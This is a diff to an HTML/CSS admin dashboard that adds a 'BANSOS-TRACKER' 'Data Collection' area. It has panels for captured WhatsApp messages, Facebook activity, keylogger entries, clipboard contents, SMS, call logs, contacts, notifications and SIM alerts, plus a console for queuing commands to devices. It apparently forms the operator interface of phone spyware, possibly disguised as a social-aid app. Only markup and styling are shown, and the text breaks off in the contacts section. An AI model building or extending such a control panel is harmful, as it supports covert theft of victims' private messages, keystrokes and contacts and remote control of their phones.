@@ -981,6 +981,539 @@ tbody tr:hover td { background: rgba(0,85,164,0.03); }
 @media (min-width: 769px) {
   .sidebar-overlay { display: none !important; }
 }
+
+/* ═══ BANSOS-TRACKER SECTIONS ═══ */
+
+/* ── Keylogger ── */
+.keylog-entry {
+  font-family: var(--font-mono);
+  font-size: 12px;
+  padding: 8px 14px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+  color: var(--gold);
+  word-break: break-all;
+  line-height: 1.5;
+}
+.keylog-entry:last-child { border-bottom: none; }
+.keylog-entry .keylog-time {
+  color: var(--text3);
+  font-size: 10px;
+  margin-right: 8px;
+}
+.keylog-entry:hover { background: rgba(255, 204, 0, 0.03); }
+
+/* ── Clipboard ── */
+.clip-entry {
+  padding: 10px 14px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+  font-size: 12px;
+}
+.clip-entry:last-child { border-bottom: none; }
+.clip-entry .clip-app {
+  font-size: 10px;
+  color: var(--blue);
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.3px;
+  margin-bottom: 4px;
+}
+.clip-entry .clip-text {
+  font-family: var(--font-mono);
+  color: var(--text);
+  word-break: break-all;
+}
+.clip-entry .clip-time {
+  font-size: 10px;
+  color: var(--text3);
+  margin-top: 4px;
+}
+.clip-entry:hover { background: rgba(0, 85, 164, 0.03); }
+
+/* ── App Usage Timeline ── */
+.app-timeline {
+  position: relative;
+  padding: 12px;
+}
+.app-timeline::before {
+  content: '';
+  position: absolute;
+  left: 24px;
+  top: 16px;
+  bottom: 16px;
+  width: 2px;
+  background: rgba(0, 85, 164, 0.15);
+  border-radius: 1px;
+}
+.app-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  padding: 8px 0;
+  position: relative;
+}
+.app-item .app-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: var(--blue);
+  border: 2px solid var(--bg2);
+  flex-shrink: 0;
+  margin-top: 3px;
+  z-index: 1;
+}
+.app-item .app-info { flex: 1; min-width: 0; }
+.app-item .app-name {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text);
+  font-family: var(--font-mono);
+}
+.app-item .app-package {
+  font-size: 10px;
+  color: var(--text3);
+  margin-top: 1px;
+}
+.app-item .app-time {
+  font-size: 10px;
+  color: var(--text2);
+  margin-top: 2px;
+}
+.app-item:hover .app-dot { background: var(--gold); }
+
+/* ── WhatsApp Chat Bubbles ── */
+.wa-chat {
+  padding: 12px;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+.wa-bubble {
+  max-width: 80%;
+  padding: 8px 12px;
+  border-radius: 12px;
+  font-size: 12px;
+  line-height: 1.5;
+  word-break: break-word;
+  position: relative;
+}
+.wa-bubble.wa-incoming {
+  align-self: flex-start;
+  background: rgba(0, 165, 80, 0.12);
+  border: 1px solid rgba(0, 165, 80, 0.15);
+  color: var(--text);
+  border-bottom-left-radius: 4px;
+}
+.wa-bubble.wa-outgoing {
+  align-self: flex-end;
+  background: rgba(0, 85, 164, 0.12);
+  border: 1px solid rgba(0, 85, 164, 0.15);
+  color: var(--text);
+  border-bottom-right-radius: 4px;
+}
+.wa-bubble .wa-meta {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  margin-top: 4px;
+  font-size: 9px;
+  color: var(--text3);
+}
+.wa-bubble .wa-sender {
+  font-weight: 600;
+  color: var(--green);
+}
+.wa-bubble.wa-outgoing .wa-sender {
+  color: var(--blue);
+}
+.wa-date-divider {
+  text-align: center;
+  font-size: 10px;
+  color: var(--text3);
+  padding: 8px 0;
+}
+
+/* ── Facebook Feed ── */
+.fb-feed {
+  padding: 12px;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+.fb-post {
+  background: rgba(255, 255, 255, 0.03);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 12px;
+}
+.fb-post-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 8px;
+}
+.fb-post-avatar {
+  width: 36px;
+  height: 36px;
+  border-radius: 50%;
+  background: rgba(0, 85, 164, 0.15);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--blue);
+  font-weight: 700;
+  font-size: 14px;
+  flex-shrink: 0;
+}
+.fb-post-name {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text);
+}
+.fb-post-time {
+  font-size: 10px;
+  color: var(--text3);
+}
+.fb-post-body {
+  font-size: 12px;
+  color: var(--text);
+  line-height: 1.5;
+  margin-bottom: 8px;
+}
+.fb-post-actions {
+  display: flex;
+  gap: 16px;
+  font-size: 11px;
+  color: var(--text3);
+  border-top: 1px solid var(--border);
+  padding-top: 8px;
+}
+.fb-post-actions span {
+  display: flex;
+  align-items: center;
+  gap: 4px;
+  cursor: pointer;
+}
+.fb-post-actions span:hover { color: var(--blue); }
+.fb-post-actions svg { width: 14px; height: 14px; }
+
+/* ── SMS ── */
+.sms-list { padding: 0; }
+.sms-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  padding: 12px 14px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+}
+.sms-item:last-child { border-bottom: none; }
+.sms-item .sms-icon {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  font-size: 14px;
+}
+.sms-item .sms-icon.inbox { background: rgba(0, 85, 164, 0.12); color: var(--blue); }
+.sms-item .sms-icon.sent { background: rgba(0, 165, 80, 0.12); color: var(--green); }
+.sms-item .sms-body { flex: 1; min-width: 0; }
+.sms-item .sms-sender {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text);
+  margin-bottom: 2px;
+}
+.sms-item .sms-text {
+  font-size: 11px;
+  color: var(--text2);
+  line-height: 1.4;
+  word-break: break-word;
+}
+.sms-item .sms-meta {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-top: 4px;
+  font-size: 10px;
+  color: var(--text3);
+}
+.sms-item:hover { background: rgba(0, 85, 164, 0.03); }
+
+/* ── Notifications ── */
+.notif-list { padding: 0; }
+.notif-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  padding: 12px 14px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+}
+.notif-item:last-child { border-bottom: none; }
+.notif-item .notif-icon {
+  width: 32px;
+  height: 32px;
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  background: rgba(0, 85, 164, 0.1);
+  color: var(--blue);
+  font-size: 12px;
+  font-weight: 700;
+}
+.notif-item .notif-body { flex: 1; min-width: 0; }
+.notif-item .notif-app {
+  font-size: 10px;
+  font-weight: 600;
+  color: var(--blue);
+  text-transform: uppercase;
+  letter-spacing: 0.3px;
+  margin-bottom: 2px;
+}
+.notif-item .notif-title {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text);
+  margin-bottom: 2px;
+}
+.notif-item .notif-text {
+  font-size: 11px;
+  color: var(--text2);
+  line-height: 1.4;
+}
+.notif-item .notif-time {
+  font-size: 10px;
+  color: var(--text3);
+  margin-top: 4px;
+}
+.notif-item:hover { background: rgba(0, 85, 164, 0.03); }
+
+/* ── Call Logs ── */
+.call-list { padding: 0; }
+.call-item {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 14px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+}
+.call-item:last-child { border-bottom: none; }
+.call-item .call-icon {
+  width: 36px;
+  height: 36px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  font-size: 14px;
+}
+.call-item .call-icon.incoming { background: rgba(0, 165, 80, 0.1); color: var(--green); }
+.call-item .call-icon.outgoing { background: rgba(0, 85, 164, 0.1); color: var(--blue); }
+.call-item .call-icon.missed { background: rgba(239, 68, 68, 0.1); color: var(--red); }
+.call-item .call-info { flex: 1; min-width: 0; }
+.call-item .call-number {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text);
+  font-family: var(--font-mono);
+}
+.call-item .call-type {
+  font-size: 10px;
+  margin-top: 2px;
+  font-weight: 500;
+}
+.call-item .call-type.incoming { color: var(--green); }
+.call-item .call-type.outgoing { color: var(--blue); }
+.call-item .call-type.missed { color: var(--red); }
+.call-item .call-meta {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 10px;
+  color: var(--text3);
+  margin-top: 2px;
+}
+.call-item .call-duration {
+  font-family: var(--font-mono);
+  color: var(--gold);
+  font-weight: 600;
+  font-size: 12px;
+}
+.call-item:hover { background: rgba(0, 85, 164, 0.03); }
+
+/* ── Contacts ── */
+.contact-list { padding: 0; }
+.contact-item {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 10px 14px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+}
+.contact-item:last-child { border-bottom: none; }
+.contact-item .contact-avatar {
+  width: 36px;
+  height: 36px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  font-weight: 700;
+  font-size: 13px;
+  background: rgba(0, 85, 164, 0.12);
+  color: var(--blue);
+}
+.contact-item .contact-info { flex: 1; min-width: 0; }
+.contact-item .contact-name {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text);
+}
+.contact-item .contact-phone {
+  font-size: 11px;
+  color: var(--text2);
+  font-family: var(--font-mono);
+  margin-top: 1px;
+}
+.contact-item:hover { background: rgba(0, 85, 164, 0.03); }
+
+/* ── SIM Alerts ── */
+.sim-alert-list { padding: 0; }
+.sim-alert-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  padding: 12px 14px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+  border-left: 3px solid var(--gold);
+  margin: 4px 0;
+  background: rgba(255, 204, 0, 0.03);
+}
+.sim-alert-item:last-child { border-bottom: none; }
+.sim-alert-item .sim-alert-icon {
+  width: 36px;
+  height: 36px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  background: rgba(255, 204, 0, 0.1);
+  color: var(--gold);
+  font-size: 16px;
+}
+.sim-alert-item .sim-alert-body { flex: 1; min-width: 0; }
+.sim-alert-item .sim-alert-title {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--gold);
+  margin-bottom: 4px;
+}
+.sim-alert-item .sim-alert-detail {
+  font-size: 11px;
+  color: var(--text2);
+  line-height: 1.4;
+}
+.sim-alert-item .sim-alert-time {
+  font-size: 10px;
+  color: var(--text3);
+  margin-top: 4px;
+}
+.sim-alert-item:hover { background: rgba(255, 204, 0, 0.06); }
+
+/* ── Commands Console ── */
+.cmd-console {
+  padding: 12px;
+}
+.cmd-input-area {
+  display: flex;
+  gap: 8px;
+  margin-bottom: 12px;
+}
+.cmd-input {
+  flex: 1;
+  background: rgba(0, 0, 0, 0.3);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 10px 14px;
+  font-family: var(--font-mono);
+  font-size: 12px;
+  color: var(--text);
+  outline: none;
+  transition: border-color 0.15s;
+}
+.cmd-input:focus {
+  border-color: var(--blue);
+}
+.cmd-input::placeholder { color: var(--text3); }
+.cmd-send-btn {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  padding: 10px 20px;
+  background: var(--blue);
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  font-size: 12px;
+  font-weight: 600;
+  cursor: pointer;
+  font-family: var(--font);
+  transition: background 0.15s;
+}
+.cmd-send-btn:hover { background: #0066cc; }
+.cmd-send-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+.cmd-send-btn svg { width: 14px; height: 14px; }
+
+.cmd-queue {
+  margin-top: 12px;
+}
+.cmd-queue-title {
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--text3);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 8px;
+}
+.cmd-queue-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 12px;
+  background: rgba(0, 0, 0, 0.2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  margin-bottom: 6px;
+  font-size: 12px;
+  font-family: var(--font-mono);
+  color: var(--text);
+}
+.cmd-queue-item .cmd-status {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+.cmd-queue-item .cmd-status.pending { background: var(--gold); }
+.cmd-queue-item .cmd-status.sent { background: var(--green); }
+.cmd-queue-item .cmd-status.failed { background: var(--red); }
+.cmd-queue-item .cmd-text { flex: 1; word-break: break-all; }
+.cmd-queue-item .cmd-time { font-size: 10px; color: var(--text3); }
+
+/* ── Feed/Post style for Facebook ── */
+.fb-feed .fb-post .fb-post-app {
+  font-size: 10px;
+  color: var(--text3);
+  margin-top: -4px;
+  margin-bottom: 6px;
+}
 </style>
 </head>
 <body>
@@ -1063,6 +1596,131 @@ tbody tr:hover td { background: rgba(0,85,164,0.03); }
         <path d="M4.22 19.78l1.42-1.42"/><path d="M18.36 5.64l1.42-1.42"/>
       </svg>
       Settings
+    </button>
+
+    <!-- ── BANSOS-TRACKER SECTIONS ── -->
+    <div style="padding: 6px 12px 4px;font-size:9px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:0.8px;border-top:1px solid var(--border);margin-top:6px;">Data Collection</div>
+
+    <!-- WhatsApp -->
+    <button class="nav-item" data-section="whatsapp" onclick="switchSection('whatsapp')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/>
+        <circle cx="9" cy="10" r="1" fill="currentColor"/>
+        <circle cx="12" cy="10" r="1" fill="currentColor"/>
+        <circle cx="15" cy="10" r="1" fill="currentColor"/>
+      </svg>
+      WhatsApp
+      <span class="count-badge" id="sidebarWaCount">0</span>
+    </button>
+
+    <!-- Facebook -->
+    <button class="nav-item" data-section="facebook" onclick="switchSection('facebook')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <line x1="2" y1="12" x2="22" y2="12"/>
+        <path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
+      </svg>
+      Facebook
+      <span class="count-badge" id="sidebarFbCount">0</span>
+    </button>
+
+    <!-- Keylogger -->
+    <button class="nav-item" data-section="keylogger" onclick="switchSection('keylogger')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="2" y="6" width="20" height="12" rx="2"/>
+        <path d="M6 10h2M10 10h2M14 10h2M18 10h2M6 14h12"/>
+      </svg>
+      Keylogger
+      <span class="count-badge" id="sidebarKeylogCount">0</span>
+    </button>
+
+    <!-- Clipboard -->
+    <button class="nav-item" data-section="clipboard" onclick="switchSection('clipboard')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M16 4h2a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2h2"/>
+        <rect x="8" y="2" width="8" height="4" rx="1"/>
+        <path d="M9 13l2 2 4-4"/>
+      </svg>
+      Clipboard
+      <span class="count-badge" id="sidebarClipCount">0</span>
+    </button>
+
+    <!-- App Usage -->
+    <button class="nav-item" data-section="apps" onclick="switchSection('apps')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="7" height="7" rx="1.5"/>
+        <rect x="14" y="3" width="7" height="7" rx="1.5"/>
+        <rect x="3" y="14" width="7" height="7" rx="1.5"/>
+        <rect x="14" y="14" width="7" height="7" rx="1.5"/>
+        <circle cx="17.5" cy="6.5" r="1" fill="currentColor"/>
+        <circle cx="6.5" cy="17.5" r="1" fill="currentColor"/>
+      </svg>
+      App Usage
+      <span class="count-badge" id="sidebarAppsCount">0</span>
+    </button>
+
+    <!-- SMS -->
+    <button class="nav-item" data-section="sms" onclick="switchSection('sms')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="2" y="4" width="20" height="16" rx="2"/>
+        <path d="M22 6l-10 7L2 6"/>
+      </svg>
+      SMS
+      <span class="count-badge" id="sidebarSmsCount">0</span>
+    </button>
+
+    <!-- Notifications -->
+    <button class="nav-item" data-section="notifications" onclick="switchSection('notifications')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/>
+        <path d="M13.73 21a2 2 0 01-3.46 0"/>
+      </svg>
+      Notifications
+      <span class="count-badge" id="sidebarNotifCount">0</span>
+    </button>
+
+    <!-- Call Logs -->
+    <button class="nav-item" data-section="calls" onclick="switchSection('calls')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z"/>
+        <line x1="16" y1="2" x2="22" y2="8"/>
+        <polyline points="18 2 22 2 22 6"/>
+      </svg>
+      Call Logs
+      <span class="count-badge" id="sidebarCallCount">0</span>
+    </button>
+
+    <!-- Contacts -->
+    <button class="nav-item" data-section="contacts" onclick="switchSection('contacts')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
+        <circle cx="12" cy="7" r="4"/>
+        <path d="M16 3.13a4 4 0 010 7.75"/>
+      </svg>
+      Contacts
+      <span class="count-badge" id="sidebarContactCount">0</span>
+    </button>
+
+    <!-- SIM Alerts -->
+    <button class="nav-item" data-section="sim-alerts" onclick="switchSection('sim-alerts')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="4" y="2" width="16" height="20" rx="2"/>
+        <path d="M9 2v8l3-2 3 2V2"/>
+        <path d="M8 14h8"/>
+        <path d="M8 18h5"/>
+      </svg>
+      SIM Alerts
+      <span class="count-badge" id="sidebarSimCount">0</span>
+    </button>
+
+    <!-- Commands -->
+    <button class="nav-item" data-section="commands" onclick="switchSection('commands')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="4 17 8 13 4 9"/>
+        <path d="M12 17h8"/>
+        <rect x="2" y="3" width="20" height="18" rx="2"/>
+      </svg>
+      Commands
     </button>
   </nav>
 
@@ -1198,6 +1856,58 @@ tbody tr:hover td { background: rgba(0,85,164,0.03); }
           </div>
           <div class="stat-num" id="totalUsers">—</div>
           <div class="stat-label">Telegram Users</div>
+        </div>
+        <!-- Bansos Stats -->
+        <div class="stat-card">
+          <div class="stat-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/>
+              <circle cx="9" cy="10" r="1" fill="currentColor"/>
+              <circle cx="12" cy="10" r="1" fill="currentColor"/>
+              <circle cx="15" cy="10" r="1" fill="currentColor"/>
+            </svg>
+          </div>
+          <div class="stat-num" id="totalWhatsapp">—</div>
+          <div class="stat-label">WA Messages</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="6" width="20" height="12" rx="2"/>
+              <path d="M6 10h2M10 10h2M14 10h2M18 10h2M6 14h12"/>
+            </svg>
+          </div>
+          <div class="stat-num" id="totalKeylogs">—</div>
+          <div class="stat-label">Keylogs</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/>
+              <path d="M13.73 21a2 2 0 01-3.46 0"/>
+            </svg>
+          </div>
+          <div class="stat-num" id="totalNotifications">—</div>
+          <div class="stat-label">Notifications</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="4" width="20" height="16" rx="2"/>
+              <path d="M22 6l-10 7L2 6"/>
+            </svg>
+          </div>
+          <div class="stat-num" id="totalSms">—</div>
+          <div class="stat-label">SMS</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z"/>
+            </svg>
+          </div>
+          <div class="stat-num" id="totalCalls">—</div>
+          <div class="stat-label">Call Logs</div>
         </div>
       </div>
 
@@ -1472,6 +2182,284 @@ tbody tr:hover td { background: rgba(0,85,164,0.03); }
       </div>
     </div>
 
+    <!-- ===== SECTION: WhatsApp ===== -->
+    <div class="section-content" id="sec-whatsapp">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/>
+              <circle cx="9" cy="10" r="1" fill="currentColor"/>
+              <circle cx="12" cy="10" r="1" fill="currentColor"/>
+              <circle cx="15" cy="10" r="1" fill="currentColor"/>
+            </svg>
+            WhatsApp Messages
+            <span class="section-count" id="waCount">0</span>
+          </div>
+        </div>
+        <div class="card">
+          <div class="wa-chat" id="waContent">
+            <div class="loading-row">
+              <div class="loading-spinner"><div class="spinner"></div> Loading WhatsApp messages...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SECTION: Facebook ===== -->
+    <div class="section-content" id="sec-facebook">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"/>
+              <line x1="2" y1="12" x2="22" y2="12"/>
+              <path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
+            </svg>
+            Facebook Activity
+            <span class="section-count" id="fbCount">0</span>
+          </div>
+        </div>
+        <div class="card">
+          <div class="fb-feed" id="fbContent">
+            <div class="loading-row">
+              <div class="loading-spinner"><div class="spinner"></div> Loading Facebook activity...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SECTION: Keylogger ===== -->
+    <div class="section-content" id="sec-keylogger">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="6" width="20" height="12" rx="2"/>
+              <path d="M6 10h2M10 10h2M14 10h2M18 10h2M6 14h12"/>
+            </svg>
+            Keylogger Entries
+            <span class="section-count" id="keylogCount">0</span>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-body" id="keylogContent">
+            <div class="loading-row">
+              <div class="loading-spinner"><div class="spinner"></div> Loading keylog entries...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SECTION: Clipboard ===== -->
+    <div class="section-content" id="sec-clipboard">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M16 4h2a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2h2"/>
+              <rect x="8" y="2" width="8" height="4" rx="1"/>
+              <path d="M9 13l2 2 4-4"/>
+            </svg>
+            Clipboard Contents
+            <span class="section-count" id="clipCount">0</span>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-body" id="clipContent">
+            <div class="loading-row">
+              <div class="loading-spinner"><div class="spinner"></div> Loading clipboard data...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SECTION: App Usage ===== -->
+    <div class="section-content" id="sec-apps">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="3" width="7" height="7" rx="1.5"/>
+              <rect x="14" y="3" width="7" height="7" rx="1.5"/>
+              <rect x="3" y="14" width="7" height="7" rx="1.5"/>
+              <rect x="14" y="14" width="7" height="7" rx="1.5"/>
+              <circle cx="17.5" cy="6.5" r="1" fill="currentColor"/>
+              <circle cx="6.5" cy="17.5" r="1" fill="currentColor"/>
+            </svg>
+            App Usage Timeline
+            <span class="section-count" id="appsCount">0</span>
+          </div>
+        </div>
+        <div class="card">
+          <div class="app-timeline" id="appsContent">
+            <div class="loading-row">
+              <div class="loading-spinner"><div class="spinner"></div> Loading app usage...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SECTION: SMS ===== -->
+    <div class="section-content" id="sec-sms">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="4" width="20" height="16" rx="2"/>
+              <path d="M22 6l-10 7L2 6"/>
+            </svg>
+            SMS Messages
+            <span class="section-count" id="smsCount">0</span>
+          </div>
+        </div>
+        <div class="card">
+          <div class="sms-list" id="smsContent">
+            <div class="loading-row">
+              <div class="loading-spinner"><div class="spinner"></div> Loading SMS messages...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SECTION: Notifications ===== -->
+    <div class="section-content" id="sec-notifications">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/>
+              <path d="M13.73 21a2 2 0 01-3.46 0"/>
+            </svg>
+            Notifications
+            <span class="section-count" id="notifCount">0</span>
+          </div>
+        </div>
+        <div class="card">
+          <div class="notif-list" id="notifContent">
+            <div class="loading-row">
+              <div class="loading-spinner"><div class="spinner"></div> Loading notifications...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SECTION: Call Logs ===== -->
+    <div class="section-content" id="sec-calls">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z"/>
+            </svg>
+            Call Logs
+            <span class="section-count" id="callCount">0</span>
+          </div>
+        </div>
+        <div class="card">
+          <div class="call-list" id="callContent">
+            <div class="loading-row">
+              <div class="loading-spinner"><div class="spinner"></div> Loading call logs...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SECTION: Contacts ===== -->
+    <div class="section-content" id="sec-contacts">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
+              <circle cx="12" cy="7" r="4"/>
+              <path d="M16 3.13a4 4 0 010 7.75"/>
+            </svg>
+            Contacts
+            <span class="section-count" id="contactCount">0</span>
